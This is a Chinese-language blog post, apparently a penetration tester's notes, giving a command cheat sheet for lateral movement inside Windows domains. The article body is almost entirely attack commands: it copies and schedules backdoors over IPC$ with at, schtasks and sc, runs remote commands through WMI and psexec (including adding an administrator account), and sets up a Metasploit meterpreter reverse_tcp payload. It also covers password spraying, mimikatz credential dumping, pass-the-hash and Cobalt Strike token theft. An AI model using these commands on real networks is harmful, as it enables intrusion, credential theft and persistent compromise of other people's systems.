@@ -1,0 +1,284 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网渗透-横向移动（上） | Flyink's blog</title><meta name="author" content="Flyink"><meta name="copyright" content="Flyink"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、账号密码连接：1. IPC连接：利用前提： 139,445开启，防火墙不阻止 开启默认共享 拥有本地或者域管账号  利用方式： 建立IPC连接连接域机器：net use \目标ip\ipc$”密码“ &#x2F;user:domain\用户名连接工作组：net use \目标ip\ipc$”密码“ &#x2F;user:用户名  复制文件（先上传到中转机器上）：copy 中转机器路径 \目标i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-横向移动（上）">
+<meta property="og:url" content="https://timerings.github.io/posts/22180.html">
+<meta property="og:site_name" content="Flyink&#39;s blog">
+<meta property="og:description" content="一、账号密码连接：1. IPC连接：利用前提： 139,445开启，防火墙不阻止 开启默认共享 拥有本地或者域管账号  利用方式： 建立IPC连接连接域机器：net use \目标ip\ipc$”密码“ &#x2F;user:domain\用户名连接工作组：net use \目标ip\ipc$”密码“ &#x2F;user:用户名  复制文件（先上传到中转机器上）：copy 中转机器路径 \目标i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://timerings.github.io/img/12.png">
+<meta property="article:published_time" content="2023-10-24T13:05:59.000Z">
+<meta property="article:modified_time" content="2023-10-24T13:14:22.544Z">
+<meta property="article:author" content="Flyink">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://timerings.github.io/img/12.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timerings.github.io/posts/22180.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"BR67XSDY5W","apiKey":"1e7af033be6ebfa1ae9b122b4e0e8cfa","indexName":"hexo","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透-横向移动（上）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-24 21:14:22'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/corner-indicator.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/12.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Flyink's blog"><span class="site-name">Flyink's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透-横向移动（上）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-24T13:05:59.000Z" title="发表于 2023-10-24 21:05:59">2023-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-24T13:14:22.544Z" title="更新于 2023-10-24 21:14:22">2023-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透-横向移动（上）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、账号密码连接："><a href="#一、账号密码连接：" class="headerlink" title="一、账号密码连接："></a>一、账号密码连接：</h1><h2 id="1-IPC连接："><a href="#1-IPC连接：" class="headerlink" title="1. IPC连接："></a>1. IPC连接：</h2><h3 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h3><ul>
+<li>139,445开启，防火墙不阻止</li>
+<li>开启默认共享</li>
+<li>拥有本地或者域管账号</li>
+</ul>
+<h3 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h3><ol>
+<li>建立IPC连接<br>连接域机器：net use \目标ip\ipc$”密码“ &#x2F;user:domain\用户名<br>连接工作组：net use \目标ip\ipc$”密码“ &#x2F;user:用户名 </li>
+<li>复制文件（先上传到中转机器上）：<br>copy 中转机器路径 \目标ip\目标路径  #注：xcopy命令可以复制文件夹 </li>
+<li>net user \目标ip &#x2F;del &#x2F;y  #断开IPC$连接 </li>
+<li>net use \ip\lipc$ “” &#x2F;user:””  #建立空连接</li>
+</ol>
+<h2 id="2-计划任务执行"><a href="#2-计划任务执行" class="headerlink" title="2. 计划任务执行"></a>2. 计划任务执行</h2><h3 id="AT命令："><a href="#AT命令：" class="headerlink" title="AT命令："></a>AT命令：</h3><ol>
+<li>建立IPC$连接<br>net use \目标ip\ipc$”密码“ &#x2F;user:用户名 </li>
+<li>查看目标系统时间<br>net time \ip </li>
+<li>将后门文件拷贝到目标系统中<br>copy 中转机器路径 \目标ip\目标路径 </li>
+<li>指定执行时间<br>at \ip:时间 C:\windows\…（后门路径）</li>
+</ol>
+<p>注意：</p>
+<ul>
+<li>at \ip &#x2F;delete &#x2F;yes  #清除at记录 </li>
+<li>at \ip 15:33:36 cmd.exe &#x2F;C “ipconfig” &gt;C:&#x2F;”1.txt” type \ip\C$\1.txt<br>#读取命令执行之后的输出内容（type是读取文件命令）</li>
+</ul>
+<h3 id="Schtasks命令（win-server2008及win7之后）"><a href="#Schtasks命令（win-server2008及win7之后）" class="headerlink" title="Schtasks命令（win server2008及win7之后）"></a>Schtasks命令（win server2008及win7之后）</h3><ol>
+<li>建立IPC$连接<br>net use \目标ip\ipc$”密码“ &#x2F;user:用户名 </li>
+<li>查看目标系统时间<br>net time \ip </li>
+<li>将后门文件拷贝到目标系统中<br>copy 中转机器路径 \目标ip\目标路径 </li>
+<li>指定执行时间<br>schtasks &#x2F;CREATE &#x2F;TN test &#x2F;TR C:\windows(后门路径) &#x2F;SC once &#x2F;RU SYSTEM &#x2F;ST 10:30 &#x2F;S 目标ip &#x2F;U 用户名 &#x2F;P 密码   #运行一次</li>
+</ol>
+<p>注意：chcp 437  #如果目标是中文系统，调整一下字符集</p>
+<h3 id="Sc命令（以服务方式上线）"><a href="#Sc命令（以服务方式上线）" class="headerlink" title="Sc命令（以服务方式上线）"></a>Sc命令（以服务方式上线）</h3><ol>
+<li>建立IPC$连接<br>net use \目标ip\ipc$”密码“ &#x2F;user:用户名 </li>
+<li>将后门文件拷贝到目标系统中（后门要生成服务马）<br>copy 中转机器路径 \目标ip\目标路径 </li>
+<li>配置服务且启动服务 <ul>
+<li>sc \ip creat “test” binpath&#x3D;”cmd &#x2F;c 服务马路径</li>
+<li>sc \ip start test”  &#x2F;&#x2F;启动服务</li>
+<li>sc \ip delete “test”  &#x2F;&#x2F;删除服务</li>
+</ul>
+</li>
+</ol>
+<h2 id="3-Wmi"><a href="#3-Wmi" class="headerlink" title="3.Wmi"></a>3.Wmi</h2><h3 id="（1）win系统自带："><a href="#（1）win系统自带：" class="headerlink" title="（1）win系统自带："></a>（1）win系统自带：</h3><ul>
+<li>在远程系统上执行bat脚本<br>wmic &#x2F;node:ip &#x2F;user:用户名 &#x2F;password:密码 process call create bat路径 </li>
+<li>在远程系统上执行单条命令<br>wmic &#x2F;node:ip &#x2F;user:用户名 &#x2F;password:密码 process call create “cmd.exe &#x2F;c net user test1 123456 &#x2F;add &amp;&amp; net localgroup adminstrators test1 &#x2F;add” </li>
+<li>在远程系统上运行exe文件<br>wmic &#x2F;node:ip &#x2F;user:用户名 &#x2F;password:密码 process call create “cmd.exe &#x2F;c exe路径”</li>
+</ul>
+<h3 id="（2）WMIEXEC-半交互式shell）"><a href="#（2）WMIEXEC-半交互式shell）" class="headerlink" title="（2）WMIEXEC(半交互式shell）"></a>（2）WMIEXEC(半交互式shell）</h3><p><a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a><br>有命令回显执行方式<br><code>&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</code><br>无命令回显<br><code>&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</code><br>模拟shell模式<br><code>&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</code><br>文件上传-复制本机calc.exe到远程主机c:\calc.exe<br><code>&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</code><br>文件下载-下载远程主机calc.exe到本地c:\calc.exe<br><code>&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</code></p>
+<h3 id="（3）impackets-wmi"><a href="#（3）impackets-wmi" class="headerlink" title="（3）impackets wmi"></a>（3）impackets wmi</h3><p>Linux跨Windows常用，使用impackets wmiexec执行命令，有回显<br><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<ul>
+<li>python wmiexec.py -hashes 00032个0:hash值 domain&#x2F;用户名@ip “whoami”</li>
+</ul>
+<h3 id="（4）MSF-wmi"><a href="#（4）MSF-wmi" class="headerlink" title="（4）MSF wmi"></a>（4）MSF wmi</h3><ul>
+<li>use exploit&#x2F;windows&#x2F;local&#x2F;wmi</li>
+<li>set rhost 目标ip</li>
+<li>set smbuser 用户名</li>
+<li>set smbpass 密码</li>
+<li>set session 1</li>
+<li>set payload windows&#x2F;meterperter&#x2F;reverse_tcp_uuid</li>
+<li>set lhost 本地ip</li>
+<li>set lport 本地端口号</li>
+<li>exploit -j</li>
+</ul>
+<h2 id="4-PSEXEC"><a href="#4-PSEXEC" class="headerlink" title="4. PSEXEC"></a>4. PSEXEC</h2><h3 id="1-impacket自带的exe文件："><a href="#1-impacket自带的exe文件：" class="headerlink" title="(1)  impacket自带的exe文件："></a>(1)  impacket自带的exe文件：</h3><ul>
+<li>psexec \ip -u 用户名 -p 密码 cmd  #返回cmd终端</li>
+<li>psexec \ip -u 用户名 -p 密码 -s cmd &#x2F;c “query user”</li>
+</ul>
+<h3 id="2-MSF-psexec-PTH"><a href="#2-MSF-psexec-PTH" class="headerlink" title="(2) MSF psexec PTH"></a>(2) MSF psexec PTH</h3><ul>
+<li>use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</li>
+<li>set rhost 目标ip</li>
+<li>set smbuser 用户名</li>
+<li>set smbdimain 域名</li>
+<li>set smbpass 00032个0:hash值</li>
+<li>exploit</li>
+</ul>
+<p>注：32个0起到hash占位作用</p>
+<h3 id="3-MSF-psexec-PTH（命令执行模块）"><a href="#3-MSF-psexec-PTH（命令执行模块）" class="headerlink" title="(3) MSF psexec PTH（命令执行模块）"></a>(3) MSF psexec PTH（命令执行模块）</h3><ul>
+<li>use exploit&#x2F;windows&#x2F;smb&#x2F;psexec_command</li>
+<li>set rhost 目标ip</li>
+<li>set smbuser 用户名</li>
+<li>set smbdimain 域名</li>
+<li>set smbpass 00032个0:hash值</li>
+<li>set command net user</li>
+<li>run</li>
+</ul>
+<h2 id="6-密码喷射"><a href="#6-密码喷射" class="headerlink" title="6. 密码喷射"></a>6. 密码喷射</h2><p>注意：</p>
+<ul>
+<li>需要知道密码锁定策略防止把账号全锁定了(K386爆破）</li>
+</ul>
+<p>步骤：</p>
+<ol>
+<li>收集用户密码和用户字典</li>
+<li>crackmapexec smb ip -u ‘adminstrator’ -p ‘123456’ –pass-po</li>
+</ol>
+<h1 id="二、-PTH哈希传递"><a href="#二、-PTH哈希传递" class="headerlink" title="二、 PTH哈希传递"></a>二、 PTH哈希传递</h1><p>在不能拿到明文，只能拿到hash的时候可以考虑使用此方法<br><strong>原理：NTLM认证过程中仅对比密码散列值是否相同，并不判断明文密码是否一致</strong></p>
+<h2 id="1-MSF-PTH-smb登录模块"><a href="#1-MSF-PTH-smb登录模块" class="headerlink" title="1. MSF PTH smb登录模块"></a>1. MSF PTH smb登录模块</h2><ul>
+<li>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</li>
+<li>set rhost ip</li>
+<li>set USER_FILE &#x2F;root&#x2F;Desktop&#x2F;user.txt</li>
+<li>set PASS_FILE &#x2F;root&#x2F;Desktop&#x2F;passwd.txt（hash）</li>
+<li>set smbdomain 域名</li>
+<li>run</li>
+</ul>
+<h2 id="2-CME-PTH"><a href="#2-CME-PTH" class="headerlink" title="2. CME PTH"></a>2. CME PTH</h2><p>CrackMapExec<br><a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>windows下建议使用编译好的版本<br>官方文档：<a target="_blank" rel="noopener" href="https://wiki.porchetta.industries/">https://wiki.porchetta.industries/</a></p>
+<h2 id="3-KALI自带的PTH攻击脚本"><a href="#3-KALI自带的PTH攻击脚本" class="headerlink" title="3. KALI自带的PTH攻击脚本"></a>3. KALI自带的PTH攻击脚本</h2><p>pth-winexe -U 用户名%00032个0:hash值 &#x2F;&#x2F;ip cmd.exe</p>
+<h2 id="4-minikatz-PTH"><a href="#4-minikatz-PTH" class="headerlink" title="4. minikatz PTH"></a>4. minikatz PTH</h2><ol>
+<li>使用管理员权限获取hash<br>minikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit” &gt; info.txt </li>
+<li>hash传递<br>minikatz.exe “privilege::debug” “sekurlsa::pth &#x2F;user:用户名 &#x2F;domain:域名 &#x2F;ntlm:hash值”</li>
+</ol>
+<h2 id="5-CS-hash传递"><a href="#5-CS-hash传递" class="headerlink" title="5. CS hash传递"></a>5. CS hash传递</h2><ol>
+<li>如果已经拿到shell，快速获取hash <ul>
+<li>getuid</li>
+<li>powershell-import D:\test\get-passhashes.ps1</li>
+<li>powershell get-passhashes</li>
+</ul>
+</li>
+<li>借助minikatzhash传递<br>minikatz sekurlsa::pth &#x2F;user:用户名 &#x2F;domain:域名 &#x2F;ntlm:hash值 &#x2F;run:”powershell -w hidden” </li>
+<li>使用steal_token功能窃取刚刚进程的令牌 <ul>
+<li>steal_token 632</li>
+<li>shell dir \ip\C$</li>
+<li>rev2self(清除）</li>
+</ul>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://timerings.github.io">Flyink</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://timerings.github.io/posts/22180.html">https://timerings.github.io/posts/22180.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://timerings.github.io" target="_blank">Flyink's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></div><div class="post_share"><div class="social-share" data-image="/img/12.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/45417.html" title="poc编写-以dahua_emap文件上传漏洞为例"><img class="cover" src="/img/7.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">poc编写-以dahua_emap文件上传漏洞为例</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Flyink</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Timerings"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9E%E6%8E%A5%EF%BC%9A"><span class="toc-text">一、账号密码连接：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-IPC%E8%BF%9E%E6%8E%A5%EF%BC%9A"><span class="toc-text">1. IPC连接：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90%EF%BC%9A"><span class="toc-text">利用前提：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">利用方式：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C"><span class="toc-text">2. 计划任务执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AT%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">AT命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schtasks%E5%91%BD%E4%BB%A4%EF%BC%88win-server2008%E5%8F%8Awin7%E4%B9%8B%E5%90%8E%EF%BC%89"><span class="toc-text">Schtasks命令（win server2008及win7之后）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sc%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BB%A5%E6%9C%8D%E5%8A%A1%E6%96%B9%E5%BC%8F%E4%B8%8A%E7%BA%BF%EF%BC%89"><span class="toc-text">Sc命令（以服务方式上线）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Wmi"><span class="toc-text">3.Wmi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89win%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%EF%BC%9A"><span class="toc-text">（1）win系统自带：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WMIEXEC-%E5%8D%8A%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%EF%BC%89"><span class="toc-text">（2）WMIEXEC(半交互式shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89impackets-wmi"><span class="toc-text">（3）impackets wmi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89MSF-wmi"><span class="toc-text">（4）MSF wmi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-PSEXEC"><span class="toc-text">4. PSEXEC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-impacket%E8%87%AA%E5%B8%A6%E7%9A%84exe%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">(1)  impacket自带的exe文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MSF-psexec-PTH"><span class="toc-text">(2) MSF psexec PTH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MSF-psexec-PTH%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9D%97%EF%BC%89"><span class="toc-text">(3) MSF psexec PTH（命令执行模块）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-text">6. 密码喷射</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-PTH%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-text">二、 PTH哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-MSF-PTH-smb%E7%99%BB%E5%BD%95%E6%A8%A1%E5%9D%97"><span class="toc-text">1. MSF PTH smb登录模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CME-PTH"><span class="toc-text">2. CME PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-KALI%E8%87%AA%E5%B8%A6%E7%9A%84PTH%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-text">3. KALI自带的PTH攻击脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-minikatz-PTH"><span class="toc-text">4. minikatz PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-CS-hash%E4%BC%A0%E9%80%92"><span class="toc-text">5. CS hash传递</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/22180.html" title="内网渗透-横向移动（上）"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透-横向移动（上）"/></a><div class="content"><a class="title" href="/posts/22180.html" title="内网渗透-横向移动（上）">内网渗透-横向移动（上）</a><time datetime="2023-10-24T13:05:59.000Z" title="发表于 2023-10-24 21:05:59">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/45417.html" title="poc编写-以dahua_emap文件上传漏洞为例"><img src="/img/7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="poc编写-以dahua_emap文件上传漏洞为例"/></a><div class="content"><a class="title" href="/posts/45417.html" title="poc编写-以dahua_emap文件上传漏洞为例">poc编写-以dahua_emap文件上传漏洞为例</a><time datetime="2023-10-24T06:15:41.000Z" title="发表于 2023-10-24 14:15:41">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/54905.html" title="内网渗透基于hash凭证抓取"><img src="/img/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透基于hash凭证抓取"/></a><div class="content"><a class="title" href="/posts/54905.html" title="内网渗透基于hash凭证抓取">内网渗透基于hash凭证抓取</a><time datetime="2023-10-24T04:32:05.000Z" title="发表于 2023-10-24 12:32:05">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/23017.html" title="SQL注入技术总结-Mssql"><img src="/img/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入技术总结-Mssql"/></a><div class="content"><a 